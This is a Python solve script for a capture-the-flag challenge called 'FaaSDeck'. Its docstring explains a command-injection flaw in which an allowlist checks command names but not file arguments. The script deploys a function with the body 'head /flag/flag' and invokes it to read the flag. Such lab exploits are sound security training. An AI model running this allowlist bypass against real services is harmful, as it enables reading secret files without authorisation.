#!/usr/bin/env python3
"""
FaaSDeck (inj, 250) — CWE-78 "serverless" command injection via the function body.

A deployed function's `body` is a shell pipeline the platform runs as the service
user (same uid/fs/flag — "isolation" is cosmetic). The body is allowlisted to
`base64,cut,head,rev,sort,tac,tail,tr,uniq,wc` — but the allowlist checks the
command, not its file argument, so an allowed reader (`head /flag/flag`) reads the
secret. Deploy that body, then invoke it. (Door 2, exec, is arg-filtered here.)

Usage:
    python3 solve.py                          # defaults to inj13.chal.deti:8052
    python3 solve.py http://inj13.chal.deti:8052
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj13.chal.deti:8052"
FLAG_RE = re.compile(r"flag\{[^}]*\}")
NAME = "pwn9"


def main() -> int:
    # `cat` is blocked by the allowlist; `head` is allowed and reads any file
    requests.post(f"{BASE}/functions", data={"name": NAME, "body": "head /flag/flag"}, timeout=10)
    r = requests.post(f"{BASE}/invoke", data={"name": NAME, "input": "x"}, timeout=10)
    m = FLAG_RE.search(r.text)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] invoke output:\n{r.text[-400:]}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
